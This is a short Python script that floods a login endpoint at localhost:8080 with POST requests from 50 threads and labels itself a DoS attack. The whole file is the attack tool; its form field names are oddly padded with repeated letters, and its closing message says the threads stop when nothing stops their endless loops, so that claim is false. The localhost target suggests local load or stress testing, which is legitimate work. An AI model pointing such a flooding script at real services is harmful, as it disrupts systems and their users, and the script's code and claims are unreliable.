import threading
import requests
import time

# Target URL
TARGET_URL = "http://localhost:8080/login"

# Number of threads to simulate concurrent users
NUM_THREADS = 50

# Function to send requests in a loop
def send_requests():
    while True:
        try:
            data = {"email": "test@example.com", "passwordeeeeeeeeeeeeeeeeeee": "passeeeeeeeeeeeeeeeeeeee"}
            response = requests.post(TARGET_URL, data=data)
            print(f"Request sent: {response.status_code}")
        except Exception as e:
            print(f"Error sending request: {e}")


# Start multiple threads to simulate high traffic
if __name__ == "__main__":
    print(f"Starting DoS attack on {TARGET_URL} with {NUM_THREADS} threads...")
    threads = []
    for i in range(NUM_THREADS):
        thread = threading.Thread(target=send_requests)
        threads.append(thread)
        thread.start()

    # Let the threads run for some time
    time.sleep(10)  # Adjust the duration of the attack
    print("Attack completed. Stopping threads.")
